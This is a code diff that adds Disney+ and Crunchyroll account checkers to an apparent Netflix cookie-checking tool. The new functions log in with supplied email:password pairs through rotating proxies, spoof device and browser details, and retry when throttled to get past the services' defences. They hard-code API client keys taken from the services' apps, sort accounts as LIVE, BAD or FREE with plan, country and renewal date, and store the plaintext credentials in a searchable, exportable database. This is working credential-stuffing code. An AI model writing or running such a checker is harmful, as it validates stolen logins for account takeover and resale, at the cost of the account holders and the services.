@@ -1,4 +1,5 @@
 import csv
+import hmac
 import http.server
 import io
 import json
@@ -11,6 +12,8 @@ import sqlite3
 import threading
 import time
 import urllib.parse
+import urllib.request
+import urllib.error
 from datetime import datetime
 import requests
 from urllib3.exceptions import InsecureRequestWarning
@@ -213,11 +216,13 @@ def init_db():
         cols = [r[1] for r in c.fetchall()]
         if "cookie_key" not in cols:
             c.execute("ALTER TABLE history ADD COLUMN cookie_key TEXT")
+        if "email" not in cols:
+            c.execute("ALTER TABLE history ADD COLUMN email TEXT DEFAULT ''")
         c.execute("CREATE INDEX IF NOT EXISTS idx_history_cookie_key ON history(cookie_key)")
         conn.commit()
         conn.close()
 
-def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie=''):
+def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie='', email=''):
     with db_lock:
         try:
             conn = get_db()
@@ -235,11 +240,10 @@ def save_history(entry_type, status, plan='', billing='', country='', route='', 
 
             if existing:
                 existing_id, ex_plan, ex_billing, ex_country, ex_token = existing
-                # Preserve existing metadata if current check returns empty (e.g. account died)
                 final_plan = plan if plan else ex_plan
                 final_billing = billing if billing else (ex_billing if status != 'DEAD' else '')
                 final_country = country if country else ex_country
-                final_token = token_url if token_url else (ex_token if status in ('LIVE', 'HOLD') else '')
+                final_token = token_url if token_url else (ex_token if status in ('LIVE', 'HOLD', 'FREE') else '')
 
                 c.execute('''
                     UPDATE history
@@ -252,19 +256,12 @@ def save_history(entry_type, status, plan='', billing='', country='', route='', 
                         route = ?,
                         token_url = ?,
                         raw_cookie = ?,
-                        cookie_key = ?
+                        cookie_key = ?,
+                        email = ?
                     WHERE id = ?
                 ''', (
-                    now,
-                    entry_type,
-                    status,
-                    final_plan,
-                    final_billing,
-                    final_country,
-                    route,
-                    final_token,
-                    raw_cookie,
-                    key,
+                    now, entry_type, status, final_plan, final_billing,
+                    final_country, route, final_token, raw_cookie, key, email,
                     existing_id
                 ))
                 if key:
@@ -272,19 +269,11 @@ def save_history(entry_type, status, plan='', billing='', country='', route='', 
                 logging.info(f"Update history [ID {existing_id}]: [{entry_type}] {status} - Plan: {final_plan} - Country: {final_country}")
             else:
                 c.execute('''
-                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key, email)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ''', (
-                    now,
-                    entry_type,
-                    status,
-                    plan,
-                    billing,
-                    country,
-                    route,
-                    token_url,
-                    raw_cookie,
-                    key
+                    now, entry_type, status, plan, billing, country,
+                    route, token_url, raw_cookie, key, email
                 ))
                 logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")
 
@@ -293,19 +282,22 @@ def save_history(entry_type, status, plan='', billing='', country='', route='', 
         except Exception as e:
             logging.error(f"Error saving history: {e}")
 
-def get_history(limit=50, offset=0, search='', status='', plan=''):
+def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''):
     with db_lock:
         conn = get_db()
         c = conn.cursor()
-        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history WHERE 1=1'
+        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
         params = []
 
         if search:
-            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ?)'
-            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
+            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
+            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
         if status:
             query += ' AND status = ?'
             params.append(status)
+        if entry_type:
+            query += ' AND type = ?'
+            params.append(entry_type)
         if plan:
             p_upper = plan.upper()
             if p_upper in ('PREMIUM', '4K'):
@@ -336,7 +328,7 @@ def get_history(limit=50, offset=0, search='', status='', plan=''):
             {
                 "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
                 "plan": r[4], "billing": r[5], "country": r[6], "route": r[7],
-                "token_url": r[8], "raw_cookie": r[9]
+                "token_url": r[8], "raw_cookie": r[9], "email": r[10] or ""
             }
             for r in rows
         ]
@@ -546,7 +538,7 @@ def get_random_proxy():
     if not valid_pool:
         valid_pool = pool
     if not valid_pool:
-        return None, None
+        return None, None, None
     choice = random.choice(valid_pool)
     lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
     return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]
@@ -841,34 +833,572 @@ def check_netflix_membership(cookie_text, use_proxy=True):
     save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
     return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah retry: {str(last_err)}", "route": route}
 
+# ══════════════════════════════════════════════════════════════════════════════
+# Disney+ Account Checker (BAMTech reverse-engineered flow)
+# ══════════════════════════════════════════════════════════════════════════════
+
+DISNEY_API_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
+DISNEY_CLIENT_ID = "disney-svod-3d9324fc"
+DISNEY_DEVICE_GQL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
+DISNEY_PUBLIC_GQL = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
+DISNEY_TOKEN_URL = "https://disney.api.edge.bamgrid.com/token"
+DISNEY_IDP_LOGIN = "https://disney.api.edge.bamgrid.com/idp/login"
+DISNEY_ACCOUNTS_GRANT = "https://disney.api.edge.bamgrid.com/accounts/grant"
+DISNEY_ACCOUNTS_ME = "https://disney.api.edge.bamgrid.com/accounts/me"
+DISNEY_SUBSCRIBERS = "https://disney.api.edge.bamgrid.com/v2/subscribers"
+DISNEY_SUBSCRIPTIONS = "https://disney.api.edge.bamgrid.com/subscriptions"
+
+DISNEY_BAMSDK_VERSION = "35.2"
+
+DISNEY_BASE_HDRS = {
+    "Accept": "application/json; charset=utf-8",
+    "Content-Type": "application/json; charset=utf-8",
+    "X-BAMSDK-Platform-Id": "browser",
+    "X-BAMSDK-Client-Id": DISNEY_CLIENT_ID,
+    "X-BAMSDK-Version": DISNEY_BAMSDK_VERSION,
+    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Origin": "https://www.disneyplus.com",
+    "Referer": "https://www.disneyplus.com/",
+    "Accept-Language": "en-US,en;q=0.9",
+}
+
+DISNEY_REGISTER_MUTATION = """mutation registerDevice($input: RegisterDeviceInput!) {
+  registerDevice(registerDevice: $input) {
+    grant { grantType assertion }
+  }
+}"""
+
+DISNEY_LOGIN_MUTATION = "mutation login($input: LoginInput!) { login(login: $input) { actionGrant } }"
+
+DISNEY_LOGIN_AG_MUTATION = (
+    "mutation loginWithActionGrant($input: LoginWithActionGrantInput!) {"
+    " loginWithActionGrant(login: $input) {"
+    "   token { accessToken refreshToken }"
+    "   activeSession { sessionId }"
+    " }"
+    "}"
+)
+
+DISNEY_REGISTER_INPUT = {
+    "applicationRuntime": "chrome",
+    "attributes": {
+        "browserName": "chrome",
+        "browserVersion": "124.0.0.0",
+        "manufacturer": "apple",
+        "model": None,
+        "operatingSystem": "macintosh",
+        "operatingSystemVersion": "10.15.7",
+        "osDeviceIds": [],
+    },
+    "deviceFamily": "browser",
+    "deviceLanguage": "en-US",
+    "deviceProfile": "macosx",
+}
+
+
+def _disney_make_opener(proxy_url):
+    if proxy_url:
+        ph = urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
+        return urllib.request.build_opener(ph)
+    return urllib.request.build_opener()
+
+
+def _disney_gql(opener, url, query, variables, op, auth, timeout=20):
+    payload = json.dumps({"query": query, "variables": variables, "operationName": op}).encode()
+    req = urllib.request.Request(url, data=payload,
+                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return r.status, json.loads(r.read())
+    except urllib.error.HTTPError as e:
+        try:
+            body = json.loads(e.read() or b"{}")
+        except Exception:
+            body = {}
+        return e.code, body
+    except Exception as exc:
+        return 0, {"_exc": str(exc)}
+
+
+def _disney_post_json(opener, url, body, auth, timeout=20):
+    data = json.dumps(body).encode()
+    req = urllib.request.Request(url, data=data,
+                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return r.status, json.loads(r.read())
+    except urllib.error.HTTPError as e:
+        try:
+            body_j = json.loads(e.read() or b"{}")
+        except Exception:
+            body_j = {}
+        return e.code, body_j
+    except Exception as exc:
+        return 0, {"_exc": str(exc)}
+
+
+def _disney_token_form(opener, form, timeout=20):
+    data = urllib.parse.urlencode(form).encode()
+    req = urllib.request.Request(DISNEY_TOKEN_URL, data=data,
+                                headers={**DISNEY_BASE_HDRS,
+                                         "Content-Type": "application/x-www-form-urlencoded",
+                                         "Authorization": f"Bearer {DISNEY_API_KEY}"})
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return json.loads(r.read())
+    except urllib.error.HTTPError as e:
+        try:
+            body = json.loads(e.read() or b"{}")
+        except Exception:
+            body = {}
+        return {"_error": e.code, **body}
+    except Exception as exc:
+        return {"_exc": str(exc)}
+
+
+def _disney_get_json(opener, url, auth, timeout=20):
+    req = urllib.request.Request(url, headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return r.status, json.loads(r.read())
+    except urllib.error.HTTPError as e:
+        try:
+            body = json.loads(e.read() or b"{}")
+        except Exception:
+            body = {}
+        return e.code, body
+    except Exception as exc:
+        return 0, {"_exc": str(exc)}
+
+
+def _disney_fresh_device_token(opener, timeout=20):
+    s, r = _disney_gql(opener, DISNEY_DEVICE_GQL, DISNEY_REGISTER_MUTATION,
+                       {"input": DISNEY_REGISTER_INPUT}, "registerDevice", DISNEY_API_KEY, timeout)
+    if s != 200 or not (r.get("data") or {}).get("registerDevice"):
+        raise RuntimeError(f"registerDevice failed {s}: {r}")
+    assertion = r["data"]["registerDevice"]["grant"]["assertion"]
+    tok = _disney_token_form(opener, {
+        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+        "latitude": "0", "longitude": "0", "platform": "browser",
+        "subject_token": assertion,
+        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
+    }, timeout)
+    if "access_token" not in tok:
+        raise RuntimeError(f"Device token exchange failed: {tok}")
+    return tok["access_token"]
+
+
+def _disney_err_code(e):
+    return (e.get("code") or e.get("extensions", {}).get("code") or "").lower()
+
+
+def _disney_is_throttled(errors):
+    return any("throttled" in _disney_err_code(e) for e in errors)
+
+
+def _disney_is_bad_creds(errors, http_status):
+    bad_fragments = ("bad-credentials", "not-found", "user-disabled",
+                     "identity.bad-credentials", "invalid-credentials", "identity.not-found")
+    for e in errors:
+        code = _disney_err_code(e)
+        if any(f in code for f in bad_fragments):
+            return True
+    return http_status == 401
+
+
+def _disney_get_country(me):
+    attrs = me.get("attributes", {})
+    purchase = attrs.get("locations", {}).get("purchase", {})
+    if purchase.get("country"):
+        return purchase["country"].upper()
+    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
+        if elem.get("name") == "dss_country_code" and elem.get("value"):
+            return elem["value"].upper()
+    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
+        if elem.get("name") == "ot_country_code" and elem.get("value"):
+            return elem["value"].upper()
+    reg = attrs.get("locations", {}).get("registration", {})
+    geoip = reg.get("geoIp", {})
+    if geoip.get("country"):
+        return geoip["country"].upper()
+    return "N/A"
+
+
+def _disney_get_active_sub(subscriptions):
+    for s in subscriptions:
+        state = s.get("state", "")
+        if state == "ACTIVE":
+            return s
+        status = (s.get("status") or {}).get("type", "")
+        if status == "SUBSCRIBED" or s.get("isActive"):
+            return s
+    return {}
+
+
+def _disney_get_renewal_date(subscriptions_raw):
+    active_s = [s for s in subscriptions_raw if s.get("isActive")]
+    all_s = active_s or subscriptions_raw
+    for s in all_s:
+        nrd = s.get("nextRenewalDate")
+        if nrd:
+            return nrd[:10]
+    return "N/A"
+
+
+def check_disney_account(email, password, use_proxy=True):
+    """Check a Disney+ account. Returns dict with status/details."""
+    proxy_url = None
+    proxy_label = "Direct"
+    if use_proxy:
+        prx, label, raw_url = get_random_proxy()
+        if prx:
+            # pick the http value
+            proxy_url = prx.get("http") or prx.get("https")
+            proxy_label = label or "Proxy"
+
+    opener = _disney_make_opener(proxy_url)
+    timeout = 20
+
+    # Step 1-2: device registration
+    try:
+        dev_tok = _disney_fresh_device_token(opener, timeout)
+    except Exception as exc:
+        save_history("disney", "ERROR", route=f"Proxy ({proxy_label})" if use_proxy else "Direct",
+                     raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": f"device-token: {exc}", "route": proxy_label}
+
+    # Step 3: login
+    id_tok = None
+    max_retries = 3
+    for attempt in range(1, max_retries + 1):
+        s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_MUTATION,
+                           {"input": {"email": email, "password": password}},
+                           "login", dev_tok, timeout)
+        errors = r.get("errors", [])
+
+        if s == 200 and not errors:
+            action_grant = (r.get("data") or {}).get("login", {}).get("actionGrant")
+            if action_grant:
+                id_tok = action_grant
+                break
+
+        if _disney_is_throttled(errors):
+            s2, r2 = _disney_post_json(opener, DISNEY_IDP_LOGIN,
+                                       {"email": email, "password": password}, dev_tok, timeout)
+            errors2 = r2.get("errors", [])
+            if s2 == 200 and "id_token" in r2:
+                id_tok = r2["id_token"]
+                break
+            if _disney_is_throttled(errors2):
+                if attempt < max_retries:
+                    time.sleep(5 * attempt)
+                    try:
+                        dev_tok = _disney_fresh_device_token(opener, timeout)
+                    except Exception:
+                        pass
+                    continue
+                save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+                return {"status": "ERROR", "reason": f"Throttled after {attempt} attempts", "route": proxy_label}
+            if _disney_is_bad_creds(errors2, s2):
+                save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+                return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}
+            desc = (errors2[0].get("description", "") or _disney_err_code(errors2[0]) if errors2 else "")
+            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": desc or f"idp/login HTTP {s2}", "route": proxy_label}
+
+        if _disney_is_bad_creds(errors, s):
+            save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}
+
+        desc = (_disney_err_code(errors[0]) if errors else "")
+        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": desc or f"gql-login HTTP {s}", "route": proxy_label}
+
+    if not id_tok:
+        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": "Login: no id_token", "route": proxy_label}
+
+    # Step 4: account token
+    acc_tok = None
+    s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_AG_MUTATION,
+                       {"input": {"actionGrant": id_tok}},
+                       "loginWithActionGrant", dev_tok, timeout)
+    ag_data = (r.get("data") or {}).get("loginWithActionGrant", {})
+    gql_acc_tok = (ag_data.get("token") or {}).get("accessToken")
+
+    if s == 200 and gql_acc_tok:
+        acc_tok = gql_acc_tok
+    else:
+        s2, r2 = _disney_post_json(opener, DISNEY_ACCOUNTS_GRANT, {"id_token": id_tok}, dev_tok, timeout)
+        if s2 != 200 or "assertion" not in r2:
+            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"accounts/grant HTTP {s2}", "route": proxy_label}
+        tok2 = _disney_token_form(opener, {
+            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+            "subject_token": r2["assertion"],
+            "subject_token_type": "urn:bamtech:params:oauth:token-type:account",
+            "latitude": "0", "longitude": "0", "platform": "browser",
+        }, timeout)
+        acc_tok = tok2.get("access_token")
+        if not acc_tok:
+            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"account token failed", "route": proxy_label}
+
+    # Step 5: /accounts/me
+    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
+    if s_me != 200:
+        me = {}
+
+    # Step 6: /v2/subscribers
+    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
+    if s_subs != 200:
+        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}
+
+    # Step 7: /subscriptions
+    subscriptions_raw = []
+    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
+    if s_rs == 200 and isinstance(rs, list):
+        subscriptions_raw = rs
+
+    # Extract info
+    attrs = me.get("attributes", {})
+    email_verified = str(attrs.get("emailVerified", False)).lower()
+    country = _disney_get_country(me)
+    country_name = normalize_country(country) if len(country) == 2 else country
+
+    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
+    v2_subs = v2.get("subscriptions", [])
+    active = _disney_get_active_sub(v2_subs)
+
+    if active:
+        product = active.get("product", {})
+        plan_name = product.get("name") or "Disney Plus"
+        term = active.get("term", {})
+        is_trial = term.get("isFreeTrial", False)
+        has_plan = True
+        status = "LIVE"
+    else:
+        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
+        is_trial = False
+        has_plan = False
+        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"
+
+    renewal = _disney_get_renewal_date(subscriptions_raw)
+
+    # Save to history
+    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
+    save_history("disney", status, plan=plan_name, billing=renewal,
+                 country=country_name, route=route,
+                 raw_cookie=f"{email}:{password}", email=email)
+
+    return {
+        "status": status,
+        "email": email,
+        "email_verified": email_verified,
+        "country": country_name,
+        "plan": plan_name,
+        "free_trial": is_trial,
+        "renewal_date": renewal,
+        "subscriber_status": subscriber_status,
+        "has_plan": has_plan,
+        "route": route,
+    }
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Crunchyroll Account Checker (Android API reverse-engineered flow)
+# ══════════════════════════════════════════════════════════════════════════════
+
+CR_AUTH_BASIC = "Basic YWJvdGxoMXdlcTByNGxudm5haHo6dWlLSjJqUXRVX0FQYzdZa0hqSWlDTFoyMjhnbGxOY2o="
+CR_AUTH_FALLBACK = "Basic dC1rZGdwMmg4YzNqdWI4Zm4wZnE6eWZMRGZNZnJZdktYaDRKWFMxTEVJMmNDcXUxdjVXYW4="
+
+def check_crunchyroll_account(email, password, use_proxy=True):
+    """Check a Crunchyroll account: login → profile → subscription."""
+    import uuid as _uuid
+    route = "Direct"
+    proxies = None
+
+    if use_proxy:
+        proxy_result = get_random_proxy()
+        if proxy_result and proxy_result[0]:
+            proxies = proxy_result[0]   # {"http": ..., "https": ...}
+            route = proxy_result[1]     # "ip:port (latency)"
+
+    session = requests.Session()
+    session.verify = False
+
+    android_ver = str(random.randint(13, 15))
+    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
+    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"
+
+    session.headers.update({
+        "Authorization": CR_AUTH_BASIC,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": ua,
+        "Connection": "Keep-Alive",
+        "etp-anonymous-id": str(_uuid.uuid4()),
+        "x-datadog-sampling-priority": "0",
+    })
+
+    if proxies:
+        session.proxies = proxies
+
+    # Step 1: Login
+    try:
+        login_data = {
+            "username": email,
+            "password": password,
+            "grant_type": "password",
+            "scope": "offline_access",
+            "device_id": str(_uuid.uuid4()),
+            "device_name": "sdk_gphone64_x86_64",
+            "device_type": "Google sdk_gphone64_x86_64",
+        }
+        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+
+        # Fallback to alternate auth token if client_inactive
+        if r.status_code == 401 and "client_inactive" in r.text:
+            session.headers["Authorization"] = CR_AUTH_FALLBACK
+            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+
+        if r.status_code == 401:
+            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
+        if r.status_code == 403:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
+        if r.status_code == 429:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
+        if r.status_code == 500:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"Server error: {r.text[:100]}", "route": route}
+        if r.status_code != 200:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"Login failed ({r.status_code})", "route": route}
+
+        jwt = r.json().get("access_token")
+        if not jwt:
+            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "BAD", "reason": "No access token returned", "route": route}
+
+        session.headers["Authorization"] = f"Bearer {jwt}"
+    except requests.exceptions.RequestException as e:
+        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}
+
+    # Step 2: Get external_id
+    external_id = None
+    try:
+        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
+        if r.status_code == 200:
+            external_id = r.json().get("external_id")
+            cr_email = r.json().get("email", email)
+            email_verified = r.json().get("email_verified", False)
+        else:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
+    except Exception as e:
+        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}
+
+    # Step 3: Get profile info
+    num_profiles = 1
+    username = ""
+    country = ""
+    try:
+        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
+        if r.status_code == 200:
+            profiles = r.json().get("profiles", [])
+            num_profiles = len(profiles)
+            if profiles:
+                first = profiles[0]
+                username = first.get("username", "")
+                ext_ratings = first.get("extended_maturity_rating", {})
+                country = next(iter(ext_ratings.keys()), "") if ext_ratings else ""
+    except Exception:
+        pass
+
+    # Step 4: Check subscription
+    subscription = "Free"
+    try:
+        if external_id:
+            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                items = data.get("items", [])
+                total_items = data.get("total", 0)
+                if total_items > 0:
+                    benefits = [item.get("benefit", "") for item in items]
+                    if "cr_mega_pack" in benefits:
+                        subscription = "Mega Pack"
+                    elif "cr_fan_pack" in benefits:
+                        subscription = "Fan Pack"
+                    elif "cr_premium" in benefits:
+                        subscription = "Premium"
+                    else:
+                        subscription = "Unknown Premium"
+                else:
+                    subscription = "Free"
+            elif r.status_code == 404:
+                subscription = "Free"
+    except Exception:
+        pass
+
+    session.close()
+
+    status = "LIVE" if subscription != "Free" else "FREE"
+
+    result = {
+        "status": status,
+        "email": cr_email if 'cr_email' in dir() else email,
+        "email_verified": email_verified if 'email_verified' in dir() else False,
+        "username": username,
+        "country": country.upper() if country else "",
+        "subscription": subscription,
+        "profiles": num_profiles,
+        "external_id": external_id,
+        "route": route,
+    }
+
+    # Save to history
+    plan_str = f"Crunchyroll {subscription}"
+    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
+                 route=route, raw_cookie=f"{email}:{password}", email=email)
+
+    return result
+
+
 # In-memory sliding window rate limiter
 rate_limit_lock = threading.Lock()
 ip_request_history = {}
 
-def is_rate_limited(ip, max_requests=40, window_seconds=10):
+def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
     if not ip:
         return False
+    key = f"{bucket}:{ip}"
     now = time.time()
     with rate_limit_lock:
-        timestamps = ip_request_history.get(ip, [])
+        timestamps = ip_request_history.get(key, [])
         # prune timestamps older than window
         timestamps = [t for t in timestamps if now - t < window_seconds]
         if len(timestamps) >= max_requests:
-            ip_request_history[ip] = timestamps
+            ip_request_history[key] = timestamps
             return True
         timestamps.append(now)
-        ip_request_history[ip] = timestamps
+        ip_request_history[key] = timestamps
         return False
 
 def check_pin_authorized(headers):
     cfg = get_config()
-    req_pin = cfg.get("pin", "")
+    req_pin = str(cfg.get("pin", ""))
     if not req_pin:
         return True
     pin_header = headers.get("X-Suite-Pin") or headers.get("Authorization", "")
     if pin_header.startswith("Bearer "):
         pin_header = pin_header[7:].strip()
-    return pin_header == req_pin
+    return hmac.compare_digest(pin_header, req_pin)
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -955,17 +1485,18 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 search = qs.get("search", [""])[0]
                 status = qs.get("status", [""])[0]
                 plan = qs.get("plan", [""])[0]
+                entry_type = qs.get("type", [""])[0]
 
-                data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan)
+                data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan, entry_type=entry_type)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.end_headers()
                 self.wfile.write(json.dumps(data).encode("utf-8"))
 
             elif path == "/api/history/export_csv":
-                search = q_params.get("search", [""])[0]
-                status = q_params.get("status", [""])[0]
-                plan = q_params.get("plan", [""])[0]
+                search = qs.get("search", [""])[0]
+                status = qs.get("status", [""])[0]
+                plan = qs.get("plan", [""])[0]
                 csv_data = export_history_csv(search=search, status=status, plan=plan)
                 self.send_response(200)
                 self.send_header("Content-Type", "text/csv; charset=utf-8")
@@ -999,13 +1530,22 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         clen = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(clen) if clen > 0 else b"{}"
+        client_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
 
         if self.path == "/api/pin/verify":
+            if is_rate_limited(client_ip, max_requests=6, window_seconds=60, bucket="pin_verify"):
+                self.send_response(429)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Retry-After", "60")
+                self.end_headers()
+                self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
+                return
             try:
                 p = json.loads(body.decode("utf-8"))
                 cfg = get_config()
-                req_pin = cfg.get("pin", "")
-                ok = (not req_pin) or (p.get("pin") == req_pin)
+                req_pin = str(cfg.get("pin", ""))
+                pin_input = str(p.get("pin", ""))
+                ok = (not req_pin) or hmac.compare_digest(pin_input, req_pin)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.end_headers()
@@ -1015,11 +1555,19 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
 
         elif self.path == "/api/pin/set":
+            if is_rate_limited(client_ip, max_requests=6, window_seconds=60, bucket="pin_set"):
+                self.send_response(429)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Retry-After", "60")
+                self.end_headers()
+                self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
+                return
             try:
                 p = json.loads(body.decode("utf-8"))
                 cfg = get_config()
-                cur_pin = cfg.get("pin", "")
-                if cur_pin and p.get("current") != cur_pin:
+                cur_pin = str(cfg.get("pin", ""))
+                cur_input = str(p.get("current", ""))
+                if cur_pin and not hmac.compare_digest(cur_input, cur_pin):
                     self.send_response(401)
                     self.send_header("Content-Type", "application/json")
                     self.end_headers()
@@ -1042,9 +1590,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
 
-        elif self.path in ("/api/token", "/api/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear"):
-            client_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
-            if is_rate_limited(client_ip, max_requests=50, window_seconds=10):
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check") else 50
+            if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
                 self.send_header("Retry-After", "5")
@@ -1087,6 +1635,57 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     self.send_response(200)
                 except Exception as e:
                     res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(res)
+
